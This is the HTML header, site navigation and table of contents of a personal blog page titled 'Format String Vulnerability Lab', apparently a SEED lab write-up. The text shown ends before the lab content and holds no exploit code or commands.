
<!DOCTYPE html>

<html lang="zh_CN">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />

        <script async src="https://www.googletagmanager.com/gtag/js?id=G-FYHS50G6DL"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            
            gtag('config', 'G-FYHS50G6DL');
            
        </script>
    
<meta property="og:title" content="Format String Vulnerability Lab" />
  
<meta property="og:type" content="website" />
  
<meta property="og:url" content="https://silverrainz.me/notes/writeups/seedlabs/format-string-vulnerability-lab/index.html" />
  
<meta property="og:site_name" content="银色子弹" />
  
<meta property="og:description" content="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Format_String/ Lab1: Files: Makefile, vul_prog.c. Summary: vul_prog.c give a malloced array secret and asked you to get the value of scret[1] a..." />
  
<meta property="og:image" content="https://silverrainz.me/_static/logo.png" />
  
<meta property="og:image:alt" content="银色子弹" />
  
    <title>Format String Vulnerability Lab &#8212; 银色子弹</title>
    
  <!-- Loaded before other Sphinx assets -->
  <link href="../../../../_static/styles/theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
<link href="../../../../_static/styles/pydata-sphinx-theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">

    
  <link rel="stylesheet"
    href="../../../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">

    <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css" />
    <link rel="stylesheet" href="../../../../_static/styles/sphinx-book-theme.css?digest=5115cc725059bd94278eecd172e13a965bf8f5a9" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/graphviz.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/asciinema-player_2.6.1.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/asciinema-custom.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/sphinxnotes-strike.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/custom.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/ablog-custom.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/design-style.b7bb847fb20b106c3d81b95245e65545.min.css" />
    
  <!-- Pre-loaded scripts that we'll load fully later -->
  <link rel="preload" as="script" href="../../../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf">

    <script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js"></script>
    <script src="../../../../_static/jquery.js"></script>
    <script src="../../../../_static/underscore.js"></script>
    <script src="../../../../_static/doctools.js"></script>
    <script src="../../../../_static/asciinema-player_2.6.1.js"></script>
    <script src="../../../../_static/clipboard.min.js"></script>
    <script src="../../../../_static/copybutton.js"></script>
    <script src="../../../../_static/scripts/sphinx-book-theme.js?digest=9c920249402e914e316237a7dbc6769907cce411"></script>
    <script src="../../../../_static/translations.js"></script>
    <script src="../../../../_static/design-tabs.js"></script>
    <script data-isso="https://comments.silverrainz.me:30500" src="https://comments.silverrainz.me:30500/js/embed.min.js"></script>
    <link rel="canonical" href="https://silverrainz.me/notes/writeups/seedlabs/format-string-vulnerability-lab/index.html" />
    <link rel="shortcut icon" href="../../../../_static/favicon.png"/>
    <link rel="index" title="索引" href="../../../../genindex.html" />
    <link rel="search" title="搜索" href="../../../../search.html" />
    <link rel="next" title="wargme-bandit" href="../../wargame-bandit/index.html" />
    <link rel="prev" title="Seed Lab" href="../index.html" /> 
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="docsearch:language" content="zh_CN">
    

    <!-- Google Analytics -->
     
<link
  rel="alternate"
  type="application/atom+xml"
  href="../../../../blog/atom.xml"
  title="银色子弹"
/>
 
<style type="text/css">
  ul.ablog-archive {
    list-style: none;
    overflow: auto;
    margin-left: 0px;
  }
  ul.ablog-archive li {
    float: left;
    margin-right: 5px;
    font-size: 80%;
  }
  ul.postlist a {
    font-style: italic;
  }
  ul.postlist-style-disc {
    list-style-type: disc;
  }
  ul.postlist-style-none {
    list-style-type: none;
  }
  ul.postlist-style-circle {
    list-style-type: circle;
  }
</style>

  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="60">
<!-- Checkboxes to toggle the left sidebar -->
<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle navigation sidebar">
<label class="overlay overlay-navbar" for="__navigation">
    <div class="visually-hidden">Toggle navigation sidebar</div>
</label>
<!-- Checkboxes to toggle the in-page toc -->
<input type="checkbox" class="sidebar-toggle" name="__page-toc" id="__page-toc" aria-label="Toggle in-page Table of Contents">
<label class="overlay overlay-pagetoc" for="__page-toc">
    <div class="visually-hidden">Toggle in-page Table of Contents</div>
</label>
<!-- Headers at the top -->
<div class="announcement header-item noprint"></div>
<div class="header header-item noprint"></div>

    
    <div class="container-fluid" id="banner"></div>

    

    <div class="container-xl">
      <div class="row">
          
<!-- Sidebar -->
<div class="bd-sidebar noprint" id="site-navigation">
    <div class="bd-sidebar__content">
        <div class="bd-sidebar__top"><div class="navbar-brand-box">
    <a class="navbar-brand text-wrap" href="../../../../index.html">
      
        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
        
      
      
      <img src="../../../../_static/logo.png" class="logo" alt="logo">
      
      
      <h1 class="site-logo" id="site-title">银色子弹</h1>
      
    </a>
</div><form class="bd-search d-flex align-items-center" action="../../../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search the docs ..." aria-label="Search the docs ..." autocomplete="off" >
</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item active">
        <p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  笔记
 </span>
</p>
<ul class="current nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../zxsys/index.html">
   造型实验室
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
  <label for="toctree-checkbox-1">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/prelude.html">
     暴露问题
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/light-and-shadow.html">
     光影分解训练
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/indoor-sketching.html">
     室内场景训练
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/outdoor-sketching.html">
     室外夜景训练
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/modeling.html">
     形体分解训练
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/fast-modeling.html">
     快速形体分解
    </a>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../../../zxsys/way-to-artist/index.html">
     艺术创作方法
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
    <label for="toctree-checkbox-2">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../zxsys/way-to-artist/prepare.html">
       课前准备
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../zxsys/way-to-artist/find-yourself.html">
       找自己
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../zxsys/way-to-artist/find-topic.html">
       找主题
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../zxsys/way-to-artist/find-language.html">
       找语言
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../zxsys/way-to-artist/stealing.html">
       偷师学艺
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../zxsys/way-to-artist/exhibition.html">
       参展须知
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/learn-from-master.html">
     向大师学绘画
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/string-modeling.html">
     线造型训练
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/tips.html">
     一些零碎知识
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../zxsys/glossary.html">
     术语
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../artstory/index.html">
   增量艺术史
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
  <label for="toctree-checkbox-3">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../artstory/artistory.html">
     艺术家史
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../artstory/gallery.html">
     画廊
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../artstory/gossip.html">
     逸闻
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../books/index.html">
   读书笔记
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
  <label for="toctree-checkbox-4">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/code-complete-2.html">
     代码大全 2
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/codex-hammer.html">
     哈默手稿
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/cpp-primer-plus.html">
     C++ Primer Plus
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/drawing-course-of-charles-bargue-and-jean-leon-gerome.html">
     查尔斯巴尔格素描教程
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/drawing-lessons-from-the-great-masters.html">
     向大师学绘画·素描基础
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/teach-yourself-scheme-in-fixnum-days.html">
     Learning Scheme
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/the-art-of-color.html">
     色彩艺术
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/the-rust-programming-language.html">
     The Rust Programming Language
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/the-story-of-art.html">
     艺术的故事
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../books/a-modern-method-for-guitar-vol1/index.html">
     伯克利现代吉他教程·卷一
    </a>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../../../books/linux-kernel-development/index.html">
     Linux Kernel Development
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
    <label for="toctree-checkbox-5">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../books/linux-kernel-development/chapter-1_2.html">
       Chapter 1 and 2
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../books/linux-kernel-development/compile-and-run-kernel-in-qemu.html">
       Compile and Run Kernel in Qemu
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../books/linux-kernel-development/misc.html">
       一些零碎的东西
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../man/index.html">
   工具手册
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
  <label for="toctree-checkbox-6">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/awk.html">
     Awk
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/deb.html">
     Debian Packing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/docker.html">
     Docker
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/gdb.html">
     GDB
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/git.html">
     Git
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/gpg.html">
     GnuPG
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/grep.html">
     Grep
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/irc.html">
     IRC
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/krita.html">
     Krita
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/latex.html">
     LaTeX
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/lily.html">
     LilyPond
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/magick.html">
     ImageMagick
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/make.html">
     Makefile
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/man.html">
     Man
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/pacman.html">
     Pacman
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/py.html">
     Python
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/rst.html">
     reStructuredText
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/sh.html">
     Shell Script
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/sphinx.html">
     Sphinx
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/systemd.html">
     SystemD
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../man/vim.html">
     Vim
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../music-theory/index.html">
   乐理笔记
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" type="checkbox"/>
  <label for="toctree-checkbox-7">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../music-theory/cadge-system.html">
     CAGED 系统
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../music-theory/interval-of-music.html">
     音程
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../music-theory/ionian/index.html">
     大调训练计划
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../music-theory/solfeggio-lesson-of-daluobei/index.html">
     大萝北的视唱课
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../6-lectures-on-sketch.html">
   素描六讲
  </a>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../2021-interview/index.html">
   2021 面试记录
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" type="checkbox"/>
  <label for="toctree-checkbox-8">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../2021-interview/checklist.html">
     知识点 Check List
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../2021-interview/leetcode.html">
     Leetcode 刷题日记
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../2021-interview/dp.html">
     动态规划
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../docutils/index.html">
   Docutils 文档阅读
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" type="checkbox"/>
  <label for="toctree-checkbox-9">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../docutils/doctree.html">
     The Docutils Document Tree
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../docutils/docutils-hacker-guide.html">
     Docutils Hacker’s Guide
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../go/index.html">
   Golang
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" type="checkbox"/>
  <label for="toctree-checkbox-10">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/pprof.html">
     PProf
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/coverage.html">
     覆盖率
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/dev.html">
     Develop Go
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/asm.html">
     Go’s Assembler
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/type-assertion.html">
     Type Assertion
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/escape-analysis.html">
     逃逸分析
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/ast.html">
     Abstract Syntax Tree
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../go/ssa.html">
     Static Single-Assignment
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../leetcode/index.html">
   Leetcode 刷题记录
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../paint-with-reason/index.html">
   完全用理性作画
  </a>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../wizard/index.html">
   配置向导
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" type="checkbox"/>
  <label for="toctree-checkbox-11">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../wizard/pi.html">
     家用树莓派 3B+ 配置
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 current active has-children">
  <a class="reference internal" href="../../index.html">
   Capture the Flag
  </a>
  <input checked="" class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" type="checkbox"/>
  <label for="toctree-checkbox-12">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul class="current">
   <li class="toctree-l2">
    <a class="reference internal" href="../../wargame-leviathan.html">
     wargame-leviathan
    </a>
   </li>
   <li class="toctree-l2 current active has-children">
    <a class="reference internal" href="../index.html">
     Seed Lab
    </a>
    <input checked="" class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" type="checkbox"/>
    <label for="toctree-checkbox-13">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul class="current">
     <li class="toctree-l3 current active">
      <a class="current reference internal" href="#">
       Format String Vulnerability Lab
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../wargame-bandit/index.html">
     wargme-bandit
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../wargame-narnia/index.html">
     wargame-narnia
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../abraxas.html">
   人造上帝
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../nju-static-program-analysis.html">
   静态程序分析
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  博客
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../blog/index.html">
   博客首页
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  随记
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../jour/2022/index.html">
   2022
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" type="checkbox"/>
  <label for="toctree-checkbox-14">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2022/07.html">
     七月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2022/06.html">
     六月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2022/05.html">
     五月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2022/04.html">
     四月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2022/03.html">
     三月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2022/02.html">
     二月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2022/01.html">
     一月
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../jour/2021/index.html">
   2021
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-15" name="toctree-checkbox-15" type="checkbox"/>
  <label for="toctree-checkbox-15">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/12.html">
     十二月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/11.html">
     十一月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/10.html">
     十月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/09.html">
     九月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/08.html">
     八月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/07.html">
     七月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/06.html">
     六月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/05.html">
     五月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/04.html">
     四月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/03.html">
     三月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/02.html">
     二月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2021/01.html">
     一月
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../jour/2020/index.html">
   2020
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-16" name="toctree-checkbox-16" type="checkbox"/>
  <label for="toctree-checkbox-16">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2020/12.html">
     十二月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2020/11.html">
     十一月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2020/08.html">
     八月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2020/07.html">
     七月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2020/06.html">
     六月
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../jour/2017/index.html">
   2017
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-17" name="toctree-checkbox-17" type="checkbox"/>
  <label for="toctree-checkbox-17">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2017/06.html">
     六月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2017/04.html">
     四月
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../jour/2017/01.html">
     一月
    </a>
   </li>
  </ul>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  关于
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../about/me.html">
   我
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../about/site.html">
   本站
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../about/friends.html">
   友人帐
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../about/resume.html">
   简历
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  事竟成
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../gtd/okr/index.html">
   OKR
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-18" name="toctree-checkbox-18" type="checkbox"/>
  <label for="toctree-checkbox-18">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../../../../gtd/okr/2022/index.html">
     2022
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-19" name="toctree-checkbox-19" type="checkbox"/>
    <label for="toctree-checkbox-19">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../../../../gtd/okr/2022/07-08.html">
       七月～八月
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../gtd/dida.html">
   滴答清单
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../gtd/sphinx-todo.html">
   嗷嗷
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  收集室
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../collections/github-halloween.html">
   Github 万圣节彩蛋
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../collections/art-works/index.html">
   Art Works
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../../../collections/scores/index.html">
   乐谱夹
  </a>
 </li>
</ul>

    </div>
</nav></div>
        <div class="bd-sidebar__bottom">
             <!-- To handle the deprecated key -->
            
            <div class="navbar_extra_footer">
            Theme by the <a href="https://ebp.jupyterbook.org">Executable Book Project</a>
            </div>
            
        </div>
    </div>
    <div id="rtd-footer-container"></div>
</div>


          


          
<!-- A tiny helper pixel to detect if we've scrolled -->
<div class="sbt-scroll-pixel-helper"></div>
<!-- Main content -->
<div class="col py-0 content-container">
    
    <div class="header-article row sticky-top noprint">
        



<div class="col py-1 d-flex header-article-main">
    <div class="header-article__left">
        
        <label for="__navigation"
  class="headerbtn"
  data-toggle="tooltip"
data-placement="right"
title="Toggle navigation"
>
  

<span class="headerbtn__icon-container">
  <i class="fas fa-bars"></i>
  </span>

</label>

        
    </div>
    <div class="header-article__right">
<button onclick="toggleFullScreen()"
  class="headerbtn"
  data-toggle="tooltip"
data-placement="bottom"
title="Fullscreen mode"
>
  

<span class="headerbtn__icon-container">
  <i class="fas fa-expand"></i>
  </span>

</button>
<a href="https://github.com/SilverRainZ/bullet"
   class="headerbtn"
   data-toggle="tooltip"
data-placement="bottom"
title="Source repository"
>
  

<span class="headerbtn__icon-container">
  <i class="fab fa-github"></i>
  </span>

</a>
<label for="__page-toc"
  class="headerbtn headerbtn-page-toc"
  
>
  

<span class="headerbtn__icon-container">
  <i class="fas fa-list"></i>
  </span>

</label>

    </div>
</div>

<!-- Table of contents -->
<div class="col-md-3 bd-toc show noprint">
    <div class="tocsection onthispage pt-5 pb-3">
        <i class="fas fa-list"></i> Contents
    </div>
    <nav id="bd-toc-nav" aria-label="Page">
        <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#lab1">
   Lab1
  </a>
  <ul class="visible nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#summary">
     Summary
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#access-varible">
     Access varible
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#overwrite-varible">
     Overwrite varible
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#bit">
     64 bit
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#lab2">
   Lab2
  </a>
 </li>
</ul>

    </nav>
</div>
    </div>
    <div class="article row">
        <div class="col pl-md-3 pl-lg-5 content-container">
            <!-- Table of contents that is only displayed when printing the page -->
            <div id="jb-print-docs-body" class="onlyprint">
                <h1>Format String Vulnerability Lab</h1>
                <!-- Table of contents -->
                <div id="print-main-content">
                    <div id="jb-print-toc">
                        
                        <div>
                            <h2> Contents </h2>
                        </div>
                        <nav aria-label="Page">
                            <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#lab1">
   Lab1
  </a>
  <ul class="visible nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#summary">
     Summary
    </a>
